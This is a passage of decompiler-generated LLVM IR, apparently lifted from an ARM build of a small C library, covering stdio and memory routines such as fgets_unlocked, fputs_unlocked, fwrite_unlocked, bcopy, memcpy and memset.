  store i32 %v1_113e4, i32* %r3.global-to-local, align 4
  %v1_113e8 = and i32 %v1_113e4, 832
  %v2_113e8 = icmp eq i32 %v1_113e8, 0
  store i1 %v2_113e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113e8, label %dec_label_pc_113f0, label %bb39

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113dc
  store i32 %v0_113f0, i32* @r0, align 4
  %v0_113f4 = call i32 @__stdio_wcommit()
  store i32 %v0_113f4, i32* %r0.global-to-local, align 4
  %v2_113f8 = icmp eq i32 %v0_113f4, 0
  store i1 %v2_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113f8, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_113f0
  %v1_113fc = load i32, i32* @r6, align 4
  %v2_113fc = inttoptr i32 %v1_113fc to i32*
  %v3_113fc = load i32, i32* %v2_113fc, align 4
  store i32 %v3_113fc, i32* %r3.global-to-local, align 4
  %v2_11400 = add i32 %v1_113fc, 8
  %v3_11400 = inttoptr i32 %v2_11400 to i32*
  %v4_11400 = load i32, i32* %v3_11400, align 4
  %v2_11404 = and i32 %v3_113fc, -65
  store i32 %v2_11404, i32* %r3.global-to-local, align 4
  %v4_11408 = sdiv i32 %v3_113fc, 256
  store i32 %v4_11408, i32* %r1.global-to-local, align 4
  %v3_1140c = add i32 %v1_113fc, 28
  %v4_1140c = inttoptr i32 %v3_1140c to i32*
  store i32 %v4_11400, i32* %v4_1140c, align 4
  %v1_11410 = load i32, i32* %r1.global-to-local, align 4
  %v2_11410 = trunc i32 %v1_11410 to i8
  %v3_11410 = load i32, i32* @r6, align 4
  %v4_11410 = add i32 %v3_11410, 1
  %v5_11410 = inttoptr i32 %v4_11410 to i8*
  store i8 %v2_11410, i8* %v5_11410, align 1
  %v0_11414.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11414.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_11414 = load i32, i32* %r3.global-to-local, align 4
  %v2_11414 = trunc i32 %v1_11414 to i8
  %v3_11414 = load i32, i32* @r6, align 4
  %v4_11414 = inttoptr i32 %v3_11414 to i8*
  store i8 %v2_11414, i8* %v4_11414, align 1
  %v0_11418.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11418.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_113f0, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_113dc, %.thread6, %.thread7
  %v2_11420 = load i32, i32* @global_var_2253c.322, align 4
  store i32 %v2_11420, i32* %r3.global-to-local, align 4
  %v7_11424 = icmp eq i32 %v2_11420, 2
  store i1 %v7_11424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11424, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_112ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 79548)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_11394, %bb40
  %v0_1143c = load i32, i32* @r6, align 4
  %v1_1143c = add i32 %v0_1143c, 32
  %v2_1143c = inttoptr i32 %v1_1143c to i32*
  %v3_1143c = load i32, i32* %v2_1143c, align 4
  store i32 %v3_1143c, i32* @r6, align 4
  %v2_11440 = icmp eq i32 %v3_1143c, 0
  store i1 %v2_11440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11440, label %dec_label_pc_11440.dec_label_pc_11448_crit_edge, label %dec_label_pc_11394

dec_label_pc_11440.dec_label_pc_11448_crit_edge:  ; preds = %.thread11
  %v0_11448.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11448

dec_label_pc_11448:                               ; preds = %dec_label_pc_11440.dec_label_pc_11448_crit_edge, %dec_label_pc_11304
  %v0_11448 = phi i32 [ %v0_11448.pre, %dec_label_pc_11440.dec_label_pc_11448_crit_edge ], [ %v1_11384, %dec_label_pc_11304 ]
  %v1_11448 = call i32 @_stdio_openlist_dec_use(i32 %v0_11448)
  store i32 %v1_11448, i32* %r0.global-to-local, align 4
  %v0_1148c.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_11450:                               ; preds = %dec_label_pc_112f8
  %v1_11450 = inttoptr i32 %.v1_112e4 to i8*
  %v2_11450 = load i8, i8* %v1_11450, align 1
  %v3_11450 = zext i8 %v2_11450 to i32
  %v1_11454 = and i32 %v3_11450, 64
  store i32 %v1_11454, i32* %r3.global-to-local, align 4
  %v2_11454 = icmp eq i32 %v1_11454, 0
  store i1 %v2_11454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11454, label %bb41, label %dec_label_pc_11460

bb41:                                             ; preds = %dec_label_pc_11450
  br label %bb43

dec_label_pc_11460:                               ; preds = %dec_label_pc_11450
  %v0_11460 = call i32 @__stdio_wcommit()
  store i32 %v0_11460, i32* %r0.global-to-local, align 4
  %v2_11464 = icmp eq i32 %v0_11460, 0
  store i1 %v2_11464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11464, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_11460
  %v1_11468 = load i32, i32* %r8.global-to-local, align 4
  %v2_11468 = inttoptr i32 %v1_11468 to i32*
  %v3_11468 = load i32, i32* %v2_11468, align 4
  store i32 %v3_11468, i32* %r3.global-to-local, align 4
  %v2_1146c = add i32 %v1_11468, 8
  %v3_1146c = inttoptr i32 %v2_1146c to i32*
  %v4_1146c = load i32, i32* %v3_1146c, align 4
  store i32 %v4_1146c, i32* %r1.global-to-local, align 4
  %v2_11470 = and i32 %v3_11468, -65
  store i32 %v2_11470, i32* %r3.global-to-local, align 4
  %v4_11474 = sdiv i32 %v3_11468, 256
  %v2_11478 = trunc i32 %v4_11474 to i8
  %v4_11478 = add i32 %v1_11468, 1
  %v5_11478 = inttoptr i32 %v4_11478 to i8*
  store i8 %v2_11478, i8* %v5_11478, align 1
  %v0_1147c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1147c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1147c = load i32, i32* %r1.global-to-local, align 4
  %v2_1147c = load i32, i32* %r8.global-to-local, align 4
  %v3_1147c = add i32 %v2_1147c, 28
  %v4_1147c = inttoptr i32 %v3_1147c to i32*
  store i32 %v1_1147c, i32* %v4_1147c, align 4
  %v1_11480 = load i32, i32* %r3.global-to-local, align 4
  %v2_11480 = trunc i32 %v1_11480 to i8
  %v3_11480 = load i32, i32* %r8.global-to-local, align 4
  %v4_11480 = inttoptr i32 %v3_11480 to i8*
  store i8 %v2_11480, i8* %v4_11480, align 1
  %v0_11484.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11484.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_11460
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_11448, %.thread20
  %v0_1148c = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_1148c.pre, %dec_label_pc_11448 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_1148c, i32* %r0.global-to-local, align 4
  store i32 %v3_112d8, i32* @r4, align 4
  ret i32 %v0_1148c

; uselistorder directives
  uselistorder i32 %v0_1148c, { 1, 0 }
  uselistorder i32 %v3_1143c, { 1, 2, 0 }
  uselistorder i32 %v2_112ec, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 9, 2, 10, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32* bitcast (i32** @global_var_22508.331 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_26888.311, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_113dc, { 1, 0 }
  uselistorder label %dec_label_pc_11394, { 1, 0 }
  uselistorder label %dec_label_pc_11304, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_114c0 = icmp eq i32 %arg2, 0
  store i1 %v2_114c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_11548, label %dec_label_pc_1152c.preheader

dec_label_pc_1152c.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_1152c15 = add i32 %arg2, -1
  store i32 %v1_1152c15, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1152c21 = icmp eq i32 %arg2, 1
  store i1 %v7_1152c21, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1152c21, label %dec_label_pc_11538, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %dec_label_pc_1152c.preheader, %dec_label_pc_1152c.backedge
  %v1_1153024.in = phi i32 [ %v0_11530.pre, %dec_label_pc_1152c.backedge ], [ %arg3, %dec_label_pc_1152c.preheader ]
  %v1_114d8 = add i32 %v1_1153024.in, 16
  %v2_114d8 = inttoptr i32 %v1_114d8 to i32*
  %v3_114d8 = load i32, i32* %v2_114d8, align 4
  store i32 %v3_114d8, i32* %r2.global-to-local, align 4
  %v1_114dc = add i32 %v1_1153024.in, 24
  %v2_114dc = inttoptr i32 %v1_114dc to i32*
  %v3_114dc = load i32, i32* %v2_114dc, align 4
  %v3_114e0 = icmp uge i32 %v3_114d8, %v3_114dc
  store i1 %v3_114e0, i1* %cpsr_c.global-to-local, align 1
  %v9_114e0 = icmp eq i32 %v3_114d8, %v3_114dc
  store i1 %v9_114e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_114e0, label %dec_label_pc_11500, label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114d8
  %v1_114e8 = inttoptr i32 %v3_114d8 to i8*
  %v2_114e8 = load i8, i8* %v1_114e8, align 1
  %v5_114e8 = add i32 %v3_114d8, 1
  store i32 %v5_114e8, i32* %r2.global-to-local, align 4
  %v2_114ec = load i32, i32* @r4, align 4
  %v3_114ec = inttoptr i32 %v2_114ec to i8*
  store i8 %v2_114e8, i8* %v3_114ec, align 1
  %v0_114f0 = load i32, i32* @r4, align 4
  %v1_114f0 = inttoptr i32 %v0_114f0 to i8*
  %v2_114f0 = load i8, i8* %v1_114f0, align 1
  %v5_114f0 = add i32 %v0_114f0, 1
  store i32 %v5_114f0, i32* @r4, align 4
  %v2_114f4 = icmp ugt i8 %v2_114f0, 9
  store i1 %v2_114f4, i1* %cpsr_c.global-to-local, align 1
  %v7_114f4 = icmp eq i8 %v2_114f0, 10
  store i1 %v7_114f4, i1* %cpsr_z.global-to-local, align 1
  %v0_114f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_114f8 = load i32, i32* @r5, align 4
  %v2_114f8 = add i32 %v1_114f8, 16
  %v3_114f8 = inttoptr i32 %v2_114f8 to i32*
  store i32 %v0_114f8, i32* %v3_114f8, align 4
  br i1 %v7_114f4, label %dec_label_pc_11538, label %dec_label_pc_1152c.backedge

dec_label_pc_11500:                               ; preds = %dec_label_pc_114d8
  %v1_1153024 = inttoptr i32 %v1_1153024.in to i8*
  %v3_11500 = call i32 @getc_unlocked(i8* %v1_1153024)
  %v4_11500 = trunc i32 %v3_11500 to i8
  %v5_11504 = icmp eq i8 %v4_11500, -1
  store i1 %v5_11504, i1* %cpsr_c.global-to-local, align 1
  %v10_11504 = icmp eq i32 %v3_11500, -1
  store i1 %v10_11504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_11504, label %dec_label_pc_1150c, label %dec_label_pc_11528

dec_label_pc_1150c:                               ; preds = %dec_label_pc_11500
  %v0_1150c = load i32, i32* @r5, align 4
  %v1_1150c = inttoptr i32 %v0_1150c to i8*
  %v2_1150c = load i8, i8* %v1_1150c, align 1
  %v1_11510 = and i8 %v2_1150c, 8
  %v2_11510 = icmp eq i8 %v1_11510, 0
  store i1 %v2_11510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11510, label %dec_label_pc_11538, label %dec_label_pc_11548

dec_label_pc_11528:                               ; preds = %dec_label_pc_11500
  %v3_1151c = load i32, i32* @r4, align 4
  %v4_1151c = inttoptr i32 %v3_1151c to i8*
  store i8 %v4_11500, i8* %v4_1151c, align 1
  %v0_11520 = load i32, i32* @r4, align 4
  %v1_11520 = inttoptr i32 %v0_11520 to i8*
  %v2_11520 = load i8, i8* %v1_11520, align 1
  %v5_11520 = add i32 %v0_11520, 1
  store i32 %v5_11520, i32* @r4, align 4
  %v2_11524 = icmp ugt i8 %v2_11520, 9
  store i1 %v2_11524, i1* %cpsr_c.global-to-local, align 1
  %v7_11524 = icmp eq i8 %v2_11520, 10
  store i1 %v7_11524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11524, label %dec_label_pc_11538, label %dec_label_pc_1152c.backedge

dec_label_pc_1152c.backedge:                      ; preds = %dec_label_pc_11528, %dec_label_pc_114e8
  %v0_1152c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_11530.pre = load i32, i32* @r5, align 4
  %v1_1152c = add i32 %v0_1152c.pre, -1
  store i32 %v1_1152c, i32* %r6.global-to-local, align 4
  %v2_1152c = icmp ne i32 %v0_1152c.pre, 0
  store i1 %v2_1152c, i1* %cpsr_c.global-to-local, align 1
  %v7_1152c = icmp eq i32 %v0_1152c.pre, 1
  store i1 %v7_1152c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1152c, label %dec_label_pc_11538, label %dec_label_pc_114d8

dec_label_pc_11538:                               ; preds = %dec_label_pc_1152c.preheader, %dec_label_pc_11528, %dec_label_pc_1152c.backedge, %dec_label_pc_114e8, %dec_label_pc_1150c
  %v0_11538 = load i32, i32* @r4, align 4
  %v1_11538 = load i32, i32* %r7.global-to-local, align 4
  %v3_11538 = icmp uge i32 %v0_11538, %v1_11538
  store i1 %v3_11538, i1* %cpsr_c.global-to-local, align 1
  %v9_11538 = icmp eq i32 %v0_11538, %v1_11538
  store i1 %v9_11538, i1* %cpsr_z.global-to-local, align 1
  %v2_1153c = xor i1 %v9_11538, true
  %v3_1153c = and i1 %v3_11538, %v2_1153c
  br i1 %v3_1153c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_11538
  %v7_11540 = inttoptr i32 %v0_11538 to i8*
  store i8 0, i8* %v7_11540, align 1
  %v0_11544.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11544.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11538, %bb
  %v1_11544 = phi i1 [ %v1_11544.pre, %bb ], [ %v9_11538, %dec_label_pc_11538 ]
  %v0_11544 = phi i1 [ %v0_11544.pre, %bb ], [ %v3_11538, %dec_label_pc_11538 ]
  %v2_11544 = xor i1 %v1_11544, true
  %v3_11544 = and i1 %v0_11544, %v2_11544
  br i1 %v3_11544, label %.dec_label_pc_1154c_crit_edge, label %dec_label_pc_11548

.dec_label_pc_1154c_crit_edge:                    ; preds = %.thread7
  %v0_1154c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1154c

dec_label_pc_11548:                               ; preds = %entry, %dec_label_pc_1150c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1154c

dec_label_pc_1154c:                               ; preds = %.dec_label_pc_1154c_crit_edge, %dec_label_pc_11548
  %v0_1154c = phi i32 [ %v0_1154c.pre, %.dec_label_pc_1154c_crit_edge ], [ 0, %dec_label_pc_11548 ]
  ret i32 %v0_1154c

; uselistorder directives
  uselistorder i1 %v9_11538, { 1, 0, 2 }
  uselistorder i32 %v1_11538, { 1, 0 }
  uselistorder i32 %v0_11538, { 0, 2, 1 }
  uselistorder i32 %v0_1152c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_11510, { 1, 0 }
  uselistorder i32 %v3_114d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1153024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8 9, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_1154c, { 1, 0 }
  uselistorder label %dec_label_pc_11548, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11538, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_114d8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11554 = load i32, i32* @r4, align 4
  store i32 %v3_11554, i32* %stack_var_-16, align 4
  %v6_11554 = load i32, i32* @r5, align 4
  %v9_11554 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11560 = call i32 @strlen(i8* %arg1)
  store i32 %v3_11560, i32* @r6, align 4
  %v0_11568 = load i32, i32* @r5, align 4
  %v0_1156c = load i32, i32* @r4, align 4
  %v5_11578 = inttoptr i32 %v0_11568 to i8*
  %v6_11578 = call i32 @__GI_fwrite_unlocked(i32 %v0_1156c, i32 1, i32 %v3_11560, i8* %v5_11578)
  %v1_1157c = load i32, i32* @r6, align 4
  %v9_1157c = icmp eq i32 %v6_11578, %v1_1157c
  br i1 %v9_1157c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_11584 = phi i32 [ %v6_11578, %entry ], [ -1, %bb ]
  %v2_11584 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11584, i32* @r4, align 4
  store i32 %v6_11554, i32* @r5, align 4
  store i32 %v9_11554, i32* @r6, align 4
  ret i32 %v14_11584

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_11588 = load i32, i32* @r6, align 4
  %v12_11588 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_11590 = load i8, i8* %arg4, align 1
  %v4_11590 = zext i8 %v3_11590 to i32
  %v1_11594 = and i32 %v4_11590, 192
  store i32 %v1_11594, i32* %r3.global-to-local, align 4
  %v2_11598 = icmp eq i32 %v1_11594, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11598, label %dec_label_pc_115c0, label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %entry
  %v4_115b4 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_115b8 = icmp eq i32 %v4_115b4, 0
  br i1 %v2_115b8, label %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge, label %dec_label_pc_11628

dec_label_pc_115b4.dec_label_pc_115c0_crit_edge:  ; preds = %dec_label_pc_115b4
  %v0_115c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge, %entry
  %v0_115c81 = phi i32 [ %v0_115c0.pre, %dec_label_pc_115b4.dec_label_pc_115c0_crit_edge ], [ %arg2, %entry ]
  %v2_115c0 = icmp eq i32 %v0_115c81, 0
  br i1 %v2_115c0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_115c0
  br label %dec_label_pc_11628

bb:                                               ; preds = %dec_label_pc_115c0
  %v1_115c4 = load i32, i32* @r6, align 4
  %v3_115c4 = icmp eq i32 %v1_115c4, 0
  br i1 %v3_115c4, label %dec_label_pc_11628, label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %bb
  %v2_115d4 = udiv i32 -1, %v0_115c81
  %v0_115dc = load i32, i32* @r4, align 4
  store i32 %v0_115dc, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_115c4, %v2_115d4
  br i1 %tmp10, label %dec_label_pc_11600, label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115d4
  %v0_115e0 = load i32, i32* @r7, align 4
  %v2_115e8 = mul i32 %v1_115c4, %v0_115c81
  %v4_115ec = call i32 @__stdio_fwrite(i32 %v0_115e0, i32 %v2_115e8, i32 %v0_115dc)
  %v0_115f0 = load i32, i32* @r5, align 4
  %v2_115f4 = udiv i32 %v4_115ec, %v0_115f0
  store i32 %v2_115f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_11600:                               ; preds = %dec_label_pc_115d4
  %v1_11600 = inttoptr i32 %v0_115dc to i32*
  %v2_11600 = load i32, i32* %v1_11600, align 4
  %v1_11604 = or i32 %v2_11600, 8
  store i32 %v1_11604, i32* %r3.global-to-local, align 4
  %v3_11608 = sdiv i32 %v2_11600, 256
  store i32 %v3_11608, i32* %r2.global-to-local, align 4
  %v1_1160c = trunc i32 %v3_11608 to i8
  %v3_1160c = add i32 %v0_115dc, 1
  %v4_1160c = inttoptr i32 %v3_1160c to i8*
  store i8 %v1_1160c, i8* %v4_1160c, align 1
  %v0_11610 = load i32, i32* %r3.global-to-local, align 4
  %v1_11610 = trunc i32 %v0_11610 to i8
  %v2_11610 = load i32, i32* @r4, align 4
  %v3_11610 = inttoptr i32 %v2_11610 to i8*
  store i8 %v1_11610, i8* %v3_11610, align 1
  %v0_11614 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11620 = inttoptr i32 %v0_11614 to i32*
  store i32 22, i32* %v2_11620, align 4
  %v0_1162c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_11628:                               ; preds = %.thread, %dec_label_pc_115b4, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_11600, %dec_label_pc_115e8, %dec_label_pc_11628
  %v0_1162c = phi i32 [ %v0_1162c.pre, %dec_label_pc_11600 ], [ %v2_115f4, %dec_label_pc_115e8 ], [ 0, %dec_label_pc_11628 ]
  store i32 %v9_11588, i32* @r6, align 4
  store i32 %v12_11588, i32* @r7, align 4
  ret i32 %v0_1162c

; uselistorder directives
  uselistorder i32 %v3_11608, { 1, 0 }
  uselistorder i32 %v1_115c4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1162c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11628, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1164c = inttoptr i32 %arg2 to i8*
  %v3_1164c = call i32 @_memcpy(i8* %v2_1164c, i32 %arg1)
  ret i32 %v3_1164c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11650 = load i32, i32* @r0, align 4
  %v1_11650 = load i32, i32* @r1, align 4
  %v2_11650 = inttoptr i32 %v0_11650 to i8*
  %v3_11650 = call i32 @_memcpy(i8* %v2_11650, i32 %v1_11650)
  ret i32 %v3_11650
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_11664 = load i32, i32* @r2, align 4
  %v8_11664 = icmp eq i32 %v0_11664, 8
  store i1 %v8_11664, i1* %cpsr_z.global-to-local, align 1
  %v5_11668 = icmp slt i32 %v0_11664, 8
  br i1 %v5_11668, label %dec_label_pc_116c8, label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %entry
  %v4_1166c = mul i32 %arg2, 256
  %v5_1166c = or i32 %v4_1166c, %arg2
  %v4_11670 = mul i32 %v5_1166c, 65536
  %v5_11670 = or i32 %v4_11670, %v5_1166c
  store i32 %v5_11670, i32* %r1.global-to-local, align 4
  %v1_1167457 = urem i32 %tmp, 4
  %v2_1167458 = icmp eq i32 %v1_1167457, 0
  store i1 %v2_1167458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1167458, label %dec_label_pc_11684, label %bb

bb:                                               ; preds = %dec_label_pc_1166c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1166c ]
  %v3_1167859 = phi i32 [ %v6_11678, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1166c ]
  %v4_11678 = inttoptr i32 %v3_1167859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11678, align 1
  %v5_11678 = load i32, i32* %r3.global-to-local, align 4
  %v6_11678 = add i32 %v5_11678, 1
  store i32 %v6_11678, i32* %r3.global-to-local, align 4
  %v0_1167c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11688.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1167c.pr, label %dec_label_pc_11684, label %.thread

.thread:                                          ; preds = %bb
  %v2_1167c = add i32 %v0_11688.pr.pre, -1
  store i32 %v2_1167c, i32* @r2, align 4
  %v1_11674 = urem i32 %v6_11678, 4
  %v2_11674 = icmp eq i32 %v1_11674, 0
  store i1 %v2_11674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11674, label %dec_label_pc_11684, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11678.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11678.pre to i8
  br label %bb

dec_label_pc_11684:                               ; preds = %.thread, %bb, %dec_label_pc_1166c
  %v0_1169028 = phi i32 [ %tmp, %dec_label_pc_1166c ], [ %v6_11678, %bb ], [ %v6_11678, %.thread ]
  %v0_11688.pr = phi i32 [ %v0_11664, %dec_label_pc_1166c ], [ %v0_11688.pr.pre, %bb ], [ %v2_1167c, %.thread ]
  %v0_11684 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11684, i32* @ip, align 4
  %v8_1168810 = icmp eq i32 %v0_11688.pr, 8
  store i1 %v8_1168810, i1* %cpsr_z.global-to-local, align 1
  %v5_1168c11 = icmp slt i32 %v0_11688.pr, 8
  br i1 %v5_1168c11, label %dec_label_pc_116c8, label %dec_label_pc_11690.preheader

dec_label_pc_11690.preheader:                     ; preds = %dec_label_pc_11684
  %v1_1169046 = inttoptr i32 %v0_1169028 to i32*
  store i32 %v0_11684, i32* %v1_1169046, align 4
  %v3_1169047 = add i32 %v0_1169028, 4
  %v4_1169048 = inttoptr i32 %v3_1169047 to i32*
  %v5_1169049 = load i32, i32* @ip, align 4
  store i32 %v5_1169049, i32* %v4_1169048, align 4
  %v6_1169050 = add i32 %v0_1169028, 8
  store i32 %v6_1169050, i32* %r3.global-to-local, align 4
  %v0_1169451 = load i32, i32* @r2, align 4
  %v1_1169452 = add i32 %v0_1169451, -8
  store i32 %v1_1169452, i32* %r2.global-to-local, align 4
  %v5_1169c53 = icmp slt i32 %v1_1169452, 8
